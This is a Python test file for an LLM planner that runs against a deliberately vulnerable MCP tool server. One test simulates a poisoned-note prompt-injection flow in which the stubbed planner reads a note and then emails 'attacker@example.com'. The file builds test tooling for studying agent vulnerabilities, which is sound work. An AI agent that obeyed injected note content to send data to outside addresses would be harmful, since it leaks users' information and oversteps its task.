"""LLMPlanner tests — LiteLLM mocked via the completion_fn injection point."""

from __future__ import annotations

from types import SimpleNamespace
from typing import Any

import pytest
from mcp_kitchen_sink._store import NoteStore
from mcp_kitchen_sink.planner_llm import DEFAULT_ITERATION_CAP, LLMPlanner
from mcp_kitchen_sink.server_vulnerable import VulnerableKitchenSinkServer


def _text_response(text: str) -> SimpleNamespace:
    """Build a LiteLLM-shaped response with text content and no tool calls."""
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content=text, tool_calls=None))]
    )


def _tool_call(name: str, arguments: dict[str, Any], call_id: str = "call_1") -> SimpleNamespace:
    """Build one tool-call object matching LiteLLM/OpenAI shape."""
    import json as _json

    return SimpleNamespace(
        id=call_id,
        function=SimpleNamespace(name=name, arguments=_json.dumps(arguments)),
    )


def _tool_response(tool_calls: list[SimpleNamespace]) -> SimpleNamespace:
    """Build a LiteLLM-shaped response carrying tool_calls."""
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content="", tool_calls=tool_calls))]
    )


@pytest.mark.asyncio
async def test_planner_returns_text_on_pure_text_response() -> None:
    server = VulnerableKitchenSinkServer(store=NoteStore())

    async def stub(**_: Any) -> SimpleNamespace:
        return _text_response("Hello back.")

    planner = LLMPlanner(server=server, model="stub", completion_fn=stub)
    trace = await planner.run("Hi.")
    assert trace.final_output == "Hello back."
    kinds = [s.kind for s in trace.steps]
    assert kinds == ["say", "stop"]


@pytest.mark.asyncio
async def test_planner_executes_single_tool_then_responds() -> None:
    store = NoteStore()
    store.write("n1", "the note body")
    server = VulnerableKitchenSinkServer(store=store)

    calls: list[int] = []

    async def stub(**_: Any) -> SimpleNamespace:
        calls.append(len(calls))
        if len(calls) == 1:
            return _tool_response([_tool_call("read_note", {"note_id": "n1"})])
        return _text_response("I read it.")

    planner = LLMPlanner(server=server, model="stub", completion_fn=stub)
    trace = await planner.run("Please read note n1.")
    assert trace.final_output == "I read it."
    assert trace.calls("read_note") != []
    # Two iterations: one tool, one text.
    assert len(calls) == 2


@pytest.mark.asyncio
async def test_planner_executes_multi_tool_sequence() -> None:
    """W2-style flow: read poisoned note → planner sends email."""
    store = NoteStore()
    server = VulnerableKitchenSinkServer(store=store)

    iteration = [0]

    async def stub(**_: Any) -> SimpleNamespace:
        iteration[0] += 1
        if iteration[0] == 1:
            return _tool_response([_tool_call("read_note", {"note_id": "n1"})])
        if iteration[0] == 2:
            return _tool_response(
                [
                    _tool_call(
                        "send_email",
                        {"to": "attacker@example.com", "subject": "s", "body": "b"},
                        call_id="call_2",
                    )
                ]
            )
        return _text_response("done.")

    planner = LLMPlanner(server=server, model="stub", completion_fn=stub)
    trace = await planner.run("Read note n1 and process it.")
    tools_called = [s.call.name for s in trace.steps if s.kind == "tool" and s.call]
    assert tools_called == ["read_note", "send_email"]
    assert ("attacker@example.com", "s", "b") in store.sent_emails


@pytest.mark.asyncio
async def test_planner_stops_at_iteration_cap() -> None:
    """A planner that keeps requesting tool calls must terminate at the cap."""
    server = VulnerableKitchenSinkServer(store=NoteStore())

    async def stub(**_: Any) -> SimpleNamespace:
        return _tool_response([_tool_call("read_note", {"note_id": "n1"})])

    planner = LLMPlanner(server=server, model="stub", completion_fn=stub, iteration_cap=3)
    trace = await planner.run("Read note n1.")
    assert "iteration cap" in trace.final_output
    # Each iteration adds a tool step (+ the final stop)
    tool_steps = [s for s in trace.steps if s.kind == "tool"]
    assert len(tool_steps) == 3
    assert trace.steps[-1].kind == "stop"


@pytest.mark.asyncio
async def test_planner_raises_when_completion_raises() -> None:
    """Provider exceptions surface to the adapter for the skip-on-failure path."""
    server = VulnerableKitchenSinkServer(store=NoteStore())

    async def stub(**_: Any) -> SimpleNamespace:
        raise RuntimeError("provider down")

    planner = LLMPlanner(server=server, model="stub", completion_fn=stub)
    with pytest.raises(RuntimeError, match="provider down"):
        await planner.run("anything")


def test_default_iteration_cap_is_documented() -> None:
    """Pin the default so PR 4's adapter doesn't drift."""
    assert DEFAULT_ITERATION_CAP == 8
